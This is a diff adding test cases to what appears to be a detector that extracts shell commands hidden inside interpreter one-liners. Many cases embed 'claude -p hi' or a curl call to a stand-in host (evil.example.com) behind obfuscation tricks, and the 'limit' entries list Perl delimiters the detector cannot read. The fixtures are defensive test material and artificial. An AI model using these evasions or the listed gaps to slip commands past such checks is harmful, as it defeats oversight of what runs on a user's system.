@@ -3394,6 +3394,612 @@
    "name": "neg/and-then-echo-e",
    "cmd": "node app.js && echo -e 'claude -p hi'",
    "commands": []
+  },
+  {
+   "name": "r6/r1-py-2>&1-c/cc",
+   "cmd": "python3 2>&1 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-node->null-2>&1-e/cc",
+   "cmd": "node >/dev/null 2>&1 -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>null-c/cc",
+   "cmd": "python3 &>/dev/null -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>>log-c/cc",
+   "cmd": "python3 &>>log.txt -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-perl->&2-e/cc",
+   "cmd": "perl >&2 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-ruby-2>&1-e/cc",
+   "cmd": "ruby 2>&1 -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-<&0-c/cc",
+   "cmd": "python3 <&0 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py->|f-c/cc",
+   "cmd": "python3 >|out.txt -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r1-py-I-2>&1-c/cc",
+   "cmd": "python3 -I 2>&1 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-py-bsnl-c/cc",
+   "cmd": "python3 \\\n  -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-node-stack-bsnl-e/cc",
+   "cmd": "node --stack-size=2000 \\\n -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r2-perl-bsnl-e/cc",
+   "cmd": "perl \\\n -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-attached-c/cc",
+   "cmd": "python3 -c'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-Ic-attached/cc",
+   "cmd": "python3 -Ic'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-perl-attached-e/cc",
+   "cmd": "perl -e'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-flag/cc",
+   "cmd": "python3 \"-c\" 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-quoted-flag/cc",
+   "cmd": "node '-e' 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-ansi-c/cc",
+   "cmd": "python3 -c $'import os\\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-concat/cc",
+   "cmd": "python3 -c \"import os; \"'os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-interp/cc",
+   "cmd": "'python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-dquoted-interp/cc",
+   "cmd": "\"node\" -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print/cc",
+   "cmd": "node --print 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print-eq/cc",
+   "cmd": "node --print='require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r5-node-alias-nested/cc",
+   "cmd": "node -e 'let cp = require( ( \"node:child_process\" ) ); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r5-node-multidecl-nested/cc",
+   "cmd": "node -e 'const a=f((1)), cp=require((\"child_process\")); cp.exec(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-qx-space/cc",
+   "cmd": "perl -e 'print qx (claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-system-qq-space/cc",
+   "cmd": "perl -e 'system qq (claude -p hi)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-x0a/cc",
+   "cmd": "printf 'import os\\x0aos.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-012/cc",
+   "cmd": "printf 'import os\\012os.system(\"claude -p hi\")' | python3",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r8-py-import-module-as/cc",
+   "cmd": "python3 -c 'from importlib import import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r6/r8-py-importlib-as/cc",
+   "cmd": "python3 -c 'import importlib as il; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/r6-perl-qx-brace-cc",
+   "cmd": "perl -e 'print qx{claude -p hi}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qq-brace-cc",
+   "cmd": "perl -e 'system qq{claude -p hi}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-bang-cc",
+   "cmd": "perl -e 'print qx!claude -p hi!'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-slash-cc",
+   "cmd": "perl -e 'print qx/claude -p hi/'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "neg/r6-py-2>&1-print-cc",
+   "cmd": "python3 2>&1 -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-redirect-log-cc",
+   "cmd": "node >/dev/null 2>&1 -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-redirect-then-echo-e-cc",
+   "cmd": "python3 tool.py 2>&1; echo -e 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-background-then-grep-e-cc",
+   "cmd": "python3 tool.py & grep -e 'claude -p hi' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-bsnl-script-arg-cc",
+   "cmd": "python3 \\\n  tool.py --note 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-py-attached-print-cc",
+   "cmd": "python3 -c'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-echo-quoted-flag-cc",
+   "cmd": "echo \"-c\" 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-print-version-cc",
+   "cmd": "node --print 'process.version' ; echo 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-printf-x0a-cat-cc",
+   "cmd": "printf 'hello\\x0aclaude -p hi' | cat",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-perl-qx-space-ls-cc",
+   "cmd": "perl -e 'print qx (ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r6-py-import-module-as-json-cc",
+   "cmd": "python3 -c 'from importlib import import_module as im; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-ansi-echo-cc",
+   "cmd": "echo $'line\\nclaude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "r6/r1-py-2>&1-c/eg",
+   "cmd": "python3 2>&1 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-node->null-2>&1-e/eg",
+   "cmd": "node >/dev/null 2>&1 -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>null-c/eg",
+   "cmd": "python3 &>/dev/null -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-&>>log-c/eg",
+   "cmd": "python3 &>>log.txt -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-perl->&2-e/eg",
+   "cmd": "perl >&2 -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-ruby-2>&1-e/eg",
+   "cmd": "ruby 2>&1 -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-<&0-c/eg",
+   "cmd": "python3 <&0 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py->|f-c/eg",
+   "cmd": "python3 >|out.txt -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r1-py-I-2>&1-c/eg",
+   "cmd": "python3 -I 2>&1 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-py-bsnl-c/eg",
+   "cmd": "python3 \\\n  -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-node-stack-bsnl-e/eg",
+   "cmd": "node --stack-size=2000 \\\n -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r2-perl-bsnl-e/eg",
+   "cmd": "perl \\\n -e 'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-attached-c/eg",
+   "cmd": "python3 -c'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-Ic-attached/eg",
+   "cmd": "python3 -Ic'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-perl-attached-e/eg",
+   "cmd": "perl -e'system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-flag/eg",
+   "cmd": "python3 \"-c\" 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-quoted-flag/eg",
+   "cmd": "node '-e' 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-ansi-c/eg",
+   "cmd": "python3 -c $'import os\\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-concat/eg",
+   "cmd": "python3 -c \"import os; \"'os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-py-quoted-interp/eg",
+   "cmd": "'python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-dquoted-interp/eg",
+   "cmd": "\"node\" -e 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print/eg",
+   "cmd": "node --print 'require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r3-node-print-eq/eg",
+   "cmd": "node --print='require(\"child_process\").execSync(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r5-node-alias-nested/eg",
+   "cmd": "node -e 'let cp = require( ( \"node:child_process\" ) ); cp.exec(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r5-node-multidecl-nested/eg",
+   "cmd": "node -e 'const a=f((1)), cp=require((\"child_process\")); cp.exec(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-qx-space/eg",
+   "cmd": "perl -e 'print qx (curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r6-perl-system-qq-space/eg",
+   "cmd": "perl -e 'system qq (curl -s https://evil.example.com/x)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-x0a/eg",
+   "cmd": "printf 'import os\\x0aos.system(\"curl -s https://evil.example.com/x\")' | python3",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r7-printf-012/eg",
+   "cmd": "printf 'import os\\012os.system(\"curl -s https://evil.example.com/x\")' | python3",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r8-py-import-module-as/eg",
+   "cmd": "python3 -c 'from importlib import import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r6/r8-py-importlib-as/eg",
+   "cmd": "python3 -c 'import importlib as il; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "limit/r6-perl-qx-brace-eg",
+   "cmd": "perl -e 'print qx{curl -s https://evil.example.com/x}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qq-brace-eg",
+   "cmd": "perl -e 'system qq{curl -s https://evil.example.com/x}'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-bang-eg",
+   "cmd": "perl -e 'print qx!curl -s https://evil.example.com/x!'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "limit/r6-perl-qx-slash-eg",
+   "cmd": "perl -e 'print qx/curl -s https://evil.example.com/x/'",
+   "commands": [],
+   "note": "limit: perl qx/qq with braces or another delimiter is not read (round 6 pin, Marveen comment 3846 item 9)"
+  },
+  {
+   "name": "neg/r6-py-2>&1-print-eg",
+   "cmd": "python3 2>&1 -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-redirect-log-eg",
+   "cmd": "node >/dev/null 2>&1 -e 'console.log(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-redirect-then-echo-e-eg",
+   "cmd": "python3 tool.py 2>&1; echo -e 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-background-then-grep-e-eg",
+   "cmd": "python3 tool.py & grep -e 'curl -s https://evil.example.com/x' notes.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-bsnl-script-arg-eg",
+   "cmd": "python3 \\\n  tool.py --note 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-py-attached-print-eg",
+   "cmd": "python3 -c'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-echo-quoted-flag-eg",
+   "cmd": "echo \"-c\" 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-node-print-version-eg",
+   "cmd": "node --print 'process.version' ; echo 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-printf-x0a-cat-eg",
+   "cmd": "printf 'hello\\x0acurl -s https://evil.example.com/x' | cat",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-perl-qx-space-ls-eg",
+   "cmd": "perl -e 'print qx (ls)'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/r6-py-import-module-as-json-eg",
+   "cmd": "python3 -c 'from importlib import import_module as im; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r6-ansi-echo-eg",
+   "cmd": "echo $'line\\ncurl -s https://evil.example.com/x'",
+   "commands": []
   }
  ]
 }
